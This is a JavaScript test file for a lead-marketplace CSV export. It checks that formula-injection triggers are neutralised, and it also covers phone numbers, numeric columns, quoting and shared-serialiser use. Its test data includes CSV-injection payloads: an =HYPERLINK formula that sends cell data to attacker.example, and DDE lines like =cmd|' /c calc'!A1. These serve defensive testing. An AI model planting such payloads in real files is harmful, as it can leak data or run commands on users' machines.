/**
 * The purchased-lead CSV (S-12, S-13).
 *
 * Two things are checked here, and they are different. CSV quoting decides
 * how a *parser* reads a field. Formula neutralisation decides what a
 * *spreadsheet* does with one. A file can be perfectly quoted and still hand
 * Excel a live formula.
 *
 * Nothing here opens a spreadsheet. These assert what the serialiser emits.
 * No Excel, LibreOffice or Google Sheets run was performed.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  PURCHASED_EXPORT_CONTENT_TYPE,
  PURCHASED_EXPORT_HEADINGS,
  purchasedLeadsCsv,
  purchasedLeadsFilename,
  wouldSpreadsheetEvaluate,
} from "../src/lib/domain/purchased-export.ts";

const row = (overrides = {}) => ({
  leadId: "11111111-1111-1111-1111-111111111111",
  orderReference: "ORD-ABC123",
  purchasedAt: "2026-10-04T09:30:00.000Z",
  requirement: "3BHK in New Town",
  area: "Kolkata / New Town",
  configuration: "apartment",
  budgetBand: "50-75l",
  intentScore: null,
  name: "Synthetic Contact",
  mobile: "+919800000001",
  email: "synthetic@example.invalid",
  bestTimeToCall: null,
  creditsPaid: 40,
  ...overrides,
});

/**
 * A real RFC 4180 reader, because a naive `split("\r\n")` is wrong here.
 *
 * A quoted field may legitimately contain CRLF, and several of these cases
 * put one there deliberately. Splitting on the line terminator first would
 * cut such a field in half and the test would be asserting against a
 * fragment. This parses records and fields together, the way a spreadsheet
 * importer does.
 */
function parseCsv(csv) {
  const records = [];
  let record = [];
  let field = "";
  let quoted = false;
  let i = 0;
  while (i < csv.length) {
    const ch = csv[i];
    if (quoted) {
      if (ch === '"' && csv[i + 1] === '"') { field += '"'; i += 2; continue; }
      if (ch === '"') { quoted = false; i += 1; continue; }
      field += ch; i += 1; continue;
    }
    if (ch === '"') { quoted = true; i += 1; continue; }
    if (ch === ",") { record.push(field); field = ""; i += 1; continue; }
    if (ch === "\r" && csv[i + 1] === "\n") {
      record.push(field); records.push(record); record = []; field = ""; i += 2; continue;
    }
    if (ch === "\n" || ch === "\r") {
      record.push(field); records.push(record); record = []; field = ""; i += 1; continue;
    }
    field += ch; i += 1;
  }
  if (field.length > 0 || record.length > 0) { record.push(field); records.push(record); }
  return records;
}

const columnOf = (heading) => PURCHASED_EXPORT_HEADINGS.indexOf(heading);
/** One row's value for one column, as a reader that handles quotes sees it. */
function valueOf(csv, heading) {
  const [, record] = parseCsv(csv);
  return record[columnOf(heading)];
}

// ----------------------------------------------------------------- shape --

test("the header names every column once, in a fixed order", () => {
  assert.deepEqual(PURCHASED_EXPORT_HEADINGS, [
    "Lead", "Order", "Purchased", "Requirement", "Area", "Configuration",
    "Budget band", "Intent score", "Name", "Mobile", "Email",
    "Best time to call", "Credits paid",
  ]);
  assert.deepEqual(parseCsv(purchasedLeadsCsv([]))[0], [...PURCHASED_EXPORT_HEADINGS]);
  // An empty export is a header and nothing else, never an empty file: a
  // zero-byte download looks like a failure.
  assert.equal(parseCsv(purchasedLeadsCsv([])).length, 1);
});

test("an ordinary row is unchanged, byte for byte", () => {
  // The neutralisation must not touch text that never needed it.
  assert.equal(valueOf(purchasedLeadsCsv([row()]), "Requirement"), "3BHK in New Town");
  assert.equal(valueOf(purchasedLeadsCsv([row()]), "Name"), "Synthetic Contact");
  const plain = purchasedLeadsCsv([row({ mobile: "9800000001" })]);
  assert.equal(plain.includes("'"), false, `an apostrophe was added: ${plain}`);
});

// --------------------------------------------- formula neutralisation --

test("every formula trigger is neutralised, in any column of free text", () => {
  for (const trigger of ["=", "+", "-", "@"]) {
    const text = `${trigger}1+1`;
    assert.equal(wouldSpreadsheetEvaluate(text), true, text);
    for (const column of ["Requirement", "Name", "Area", "Configuration", "Best time to call"]) {
      const key = {
        Requirement: "requirement", Name: "name", Area: "area",
        Configuration: "configuration", "Best time to call": "bestTimeToCall",
      }[column];
      const csv = purchasedLeadsCsv([row({ [key]: text })]);
      assert.equal(valueOf(csv, column), `'${text}`, `${column} with ${text}`);
    }
  }
});

test("a trigger hidden behind characters a spreadsheet skips is still caught", () => {
  // This is the whole reason the check is not `text[0] === "="`. A leading
  // tab, carriage return, newline, NBSP, zero-width space or stray BOM is
  // skipped by the spreadsheet when it decides, so it must be skipped here.
  const prefixes = [
    [" ", "space"],
    ["\t", "tab"],
    ["\r", "carriage return"],
    ["\n", "newline"],
    ["\r\n", "CRLF"],
    ["\u000B", "vertical tab"],
    ["\u000C", "form feed"],
    ["\u0000", "NUL"],
    ["\u001F", "unit separator"],
    ["\u007F", "delete"],
    [" ", "no-break space"],
    ["​", "zero-width space"],
    ["‍", "zero-width joiner"],
    ["⁠", "word joiner"],
    ["﻿", "byte-order mark"],
    ["  \t   ", "a run of several"],
  ];
  for (const [prefix, label] of prefixes) {
    const text = `${prefix}=1+1`;
    assert.equal(wouldSpreadsheetEvaluate(text), true, label);
    const value = valueOf(purchasedLeadsCsv([row({ requirement: text })]), "Requirement");
    assert.equal(value, `'${text}`, `${label}: ${JSON.stringify(value)}`);
    // The original is kept whole in front of nothing — the prefix survives.
    assert.ok(value.endsWith("=1+1"), label);
  }
});

test("a realistic injection payload is neutralised and not executed as written", () => {
  const payloads = [
    '=HYPERLINK("http://attacker.example/?d="&A1,"Click for your refund")',
    "=cmd|' /c calc'!A1",
    "@SUM(1+1)*cmd|' /c calc'!A0",
    "+HYPERLINK(\"http://attacker.example\")",
    "-2+3+cmd|' /c calc'!A0",
    "=1+1;=1+2",
  ];
  for (const payload of payloads) {
    const csv = purchasedLeadsCsv([row({ requirement: payload })]);
    const value = valueOf(csv, "Requirement");
    assert.equal(value, `'${payload}`, payload);
    // The raw payload never appears at the start of a field in the file.
    assert.equal(new RegExp(`(^|,)"?${payload.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`)
      .test(csv), false, `payload begins a field unprotected: ${payload}`);
  }
});

test("text that merely contains a trigger is left alone", () => {
  for (const text of [
    "a=1", "2 + 2 bedrooms", "New Town - Action Area II", "name@example.invalid",
    "Wants 3BHK, budget 50-75l", "Rate is 5-7%",
  ]) {
    assert.equal(wouldSpreadsheetEvaluate(text), false, text);
    assert.equal(valueOf(purchasedLeadsCsv([row({ requirement: text })]), "Requirement"),
      text, text);
  }
});

// ------------------------------------------------------- phone numbers --

test("an international mobile number survives instead of becoming a number", () => {
  // `+919800000001` is a formula to a spreadsheet: it evaluates to
  // 919800000001 and the leading + is gone. That is silent corruption of
  // every export, not only an injection risk, so the same rule covers it.
  for (const mobile of ["+919800000001", "+91 98000 00001", "+1-202-555-0173", "+44 20 7946 0958"]) {
    assert.equal(wouldSpreadsheetEvaluate(mobile), true, mobile);
    const value = valueOf(purchasedLeadsCsv([row({ mobile })]), "Mobile");
    assert.equal(value, `'${mobile}`, mobile);
    assert.ok(value.includes("+"), `the plus was lost from ${mobile}`);
    // Every digit is still there, in order.
    assert.equal(value.replace(/\D/g, ""), mobile.replace(/\D/g, ""), mobile);
  }
});

test("a local number with no plus is not given a marker it does not need", () => {
  for (const mobile of ["9800000001", "98000 00001", "09800000001"]) {
    assert.equal(wouldSpreadsheetEvaluate(mobile), false, mobile);
    assert.equal(valueOf(purchasedLeadsCsv([row({ mobile })]), "Mobile"), mobile, mobile);
  }
});

// ------------------------------------------------------ numeric fields --

test("credits paid and intent score stay numeric and are never marked", () => {
  const csv = purchasedLeadsCsv([row({ creditsPaid: 1620, intentScore: 72 })]);
  assert.equal(valueOf(csv, "Credits paid"), "1620");
  assert.equal(valueOf(csv, "Intent score"), "72");
  assert.equal(csv.includes("'1620"), false, "a numeric column was marked as text");
  assert.equal(csv.includes("'72"), false, "a numeric column was marked as text");
});

test("a negative credit amount stays a number, not a neutralised string", () => {
  // A refund is negative, and `-40` starts with a trigger. A numeric column
  // must not be pushed into the text rules by its own sign, or the figure
  // stops being summable.
  const csv = purchasedLeadsCsv([row({ creditsPaid: -40 })]);
  assert.equal(valueOf(csv, "Credits paid"), "-40");
  assert.equal(csv.includes("'-40"), false, "a negative amount was marked as text");
});

test("zero is written, and a missing number is empty rather than zero", () => {
  const zero = purchasedLeadsCsv([row({ intentScore: 0, creditsPaid: 0 })]);
  assert.equal(valueOf(zero, "Intent score"), "0", "zero is a score");
  assert.equal(valueOf(zero, "Credits paid"), "0");
  const missing = purchasedLeadsCsv([row({ intentScore: null, creditsPaid: null })]);
  assert.equal(valueOf(missing, "Intent score"), "");
  assert.equal(valueOf(missing, "Credits paid"), "");
});

test("a numeric column handed something unusable is empty, not the word NaN", () => {
  for (const value of [Number.NaN, Number.POSITIVE_INFINITY, Number.NEGATIVE_INFINITY]) {
    const csv = purchasedLeadsCsv([row({ creditsPaid: value })]);
    assert.equal(valueOf(csv, "Credits paid"), "",
      `${String(value)} reached a column somebody will sum`);
  }
});

// ------------------------------------------------------------ escaping --

test("free text survives a comma, a quote, a newline and a tab", () => {
  const text = 'Wants 3BHK, "south facing", near the metro';
  assert.equal(valueOf(purchasedLeadsCsv([row({ requirement: text })]), "Requirement"), text);

  const multiline = purchasedLeadsCsv([row({ requirement: "Two\nlines" })]);
  assert.equal(valueOf(multiline, "Requirement"), "Two\nlines");
  // The newline is inside quotes, so the record count is still one.
  assert.equal(parseCsv(multiline).length, 2, "the newline split the record");

  const tabbed = purchasedLeadsCsv([row({ requirement: "Two\tcolumns" })]);
  assert.equal(valueOf(tabbed, "Requirement"), "Two\tcolumns");
  assert.ok(tabbed.includes('"Two\tcolumns"'), "a tab was not quoted");
});

test("a quote-and-trigger combination is both marked and escaped", () => {
  const text = '="a","b"';
  const csv = purchasedLeadsCsv([row({ requirement: text })]);
  assert.equal(valueOf(csv, "Requirement"), `'${text}`);
  assert.ok(csv.includes('"\'=""a"",""b"""'), `escaping is wrong: ${csv}`);
});

test("Unicode text passes through unchanged", () => {
  for (const text of [
    "নিরাপদ",
    "O’Brien — Salt Lake",
    "हिन्दी में बात",
    "emoji \u{1F3E0} and a surrogate pair",
  ]) {
    assert.equal(valueOf(purchasedLeadsCsv([row({ name: text })]), "Name"), text, text);
  }
});

test("an empty or missing field is empty, and never a marker on its own", () => {
  const csv = purchasedLeadsCsv([row({
    requirement: null, area: "", configuration: undefined, name: null,
    mobile: null, email: "", bestTimeToCall: null,
  })]);
  for (const column of ["Requirement", "Area", "Configuration", "Name", "Mobile", "Email", "Best time to call"]) {
    assert.equal(valueOf(csv, column), "", column);
  }
  assert.equal(csv.includes("'"), false, "a marker was written into an empty cell");
  // Whitespace only is not a formula and is not marked.
  assert.equal(wouldSpreadsheetEvaluate("   "), false);
  assert.equal(wouldSpreadsheetEvaluate("\t "), false);
});

test("the filename and content type are the same in both modes", () => {
  assert.equal(purchasedLeadsFilename(new Date("2026-10-04T23:59:00Z")),
    "kkl-purchased-leads-2026-10-04.csv");
  assert.equal(PURCHASED_EXPORT_CONTENT_TYPE, "text/csv; charset=utf-8");
});

test("no cell in a fully hostile row begins a field with a trigger", () => {
  // The property that matters, stated once over every column at once.
  const hostile = purchasedLeadsCsv([{
    leadId: "=1+1",
    orderReference: "+1",
    purchasedAt: "-1",
    requirement: "@SUM(A1)",
    area: "\t=1+1",
    configuration: " +1",
    budgetBand: "﻿-1",
    intentScore: 0,
    name: "=cmd|' /c calc'!A1",
    mobile: "+919800000001",
    email: "=HYPERLINK(\"http://attacker.example\")",
    bestTimeToCall: "\r@now()",
    creditsPaid: -40,
  }]);
  const [, record] = parseCsv(hostile);
  assert.equal(parseCsv(hostile).length, 2, "a hostile row became more than one record");
  for (const [index, value] of record.entries()) {
    const heading = PURCHASED_EXPORT_HEADINGS[index];
    const significant = value.replace(/^[\s\u0000-\u001F\u007F ​-‍⁠﻿]+/u, "");
    const first = significant[0];
    if (heading === "Credits paid" || heading === "Intent score") {
      // Numeric columns are allowed to start with a minus: that is a number.
      assert.match(value, /^-?\d*$/, `${heading} is not numeric: ${value}`);
      continue;
    }
    assert.ok(first === undefined || !["=", "+", "@"].includes(first),
      `${heading} begins with ${JSON.stringify(first)}: ${JSON.stringify(value)}`);
    assert.ok(first === undefined || first !== "-" || heading === "Purchased"
      || value.startsWith("'"),
      `${heading} begins with a minus unprotected: ${JSON.stringify(value)}`);
  }
});

/**
 * All three export paths must go through this serialiser.
 *
 * They did not, once: the Builder sample export had its own with nine
 * columns against the Seller's thirteen, so one requirement produced two
 * different files depending on which console asked. That is the regression
 * this guards, and it is a static check because the service modules import
 * through the `@/` alias and cannot be loaded outside the bundler.
 */
import { readFileSync } from "node:fs";

const EXPORT_PATHS = [
  ["seller sample", "src/lib/services/sample/sample-services.ts", "src/lib/services/sample/seller-store.ts"],
  ["builder sample", "src/lib/services/sample/builder-modules.ts"],
  ["connected backend", "src/lib/services/backend/commerce.ts"],
];

const read = (path) => readFileSync(new URL(`../${path}`, import.meta.url), "utf8");

test("every export path calls the shared serialiser", () => {
  for (const [label, ...paths] of EXPORT_PATHS) {
    const sources = paths.map(read).join("\n");
    assert.match(sources, /exportPurchased/, `${label} has no export`);
    assert.match(sources, /purchasedLeadsCsv/, `${label} does not use the shared serialiser`);
    assert.match(sources, /purchased-export/, `${label} does not import the shared module`);
  }
});

test("no export path builds a CSV of its own", () => {
  // The two shapes a hand-rolled serialiser takes: a local escaping helper,
  // and a header assembled inline.
  for (const [label, ...paths] of EXPORT_PATHS) {
    for (const path of paths) {
      const source = read(path);
      assert.equal(/const cell = \(/.test(source), false,
        `${label} (${path}) has a local cell escaper again`);
      assert.equal(/\["Lead",\s*"Order",/.test(source), false,
        `${label} (${path}) assembles its own header again`);
      assert.equal(/replace\(\/"\/g, '""'\)/.test(source), false,
        `${label} (${path}) does its own quote escaping again`);
    }
  }
});

test("the content type is taken from the shared module, not re-typed", () => {
  for (const [label, ...paths] of EXPORT_PATHS) {
    const sources = paths.map(read).join("\n");
    if (!/contentType/.test(sources)) continue;
    assert.match(sources, /PURCHASED_EXPORT_CONTENT_TYPE/,
      `${label} hard-codes a content type instead of sharing one`);
  }
});
